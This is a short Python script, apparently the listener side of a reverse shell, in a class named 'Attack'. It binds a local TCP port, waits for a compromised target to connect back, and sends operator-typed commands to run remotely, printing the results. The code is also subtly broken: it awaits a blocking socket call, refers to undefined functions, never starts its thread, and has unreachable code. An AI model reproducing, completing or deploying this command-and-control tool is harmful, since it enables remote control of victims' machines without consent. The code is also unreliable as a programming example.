import socket
import asyncio
import threading as thread

class Attack:
    def __init__(self):
        self.HOST = "127.0.0.1"
        self.PORT = 8080

        asyncio.run(self.await_reverse_conection())

    async def send_attack(self):
        while True:
            self.command = input("Attack: ")

            self.conn.sendall(f"{self.command}".encode('utf-8'))
            print(f"[*] Attack: {self.command}")

    def attack_target(self):
        thread.Thread(target=send_attack)

        while True:
            self.data = self.conn.recv(1024)
            self.message = self.data.decode()

            print(f"[•] Result: {self.message}")

    async def await_reverse_conection(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.HOST, self.PORT))
            s.listen(5)

            while True:
                conn, addr = await s.accept()
                self.conn = conn

            attack_to_target()

if __name__ == '__main__':
    Attack()
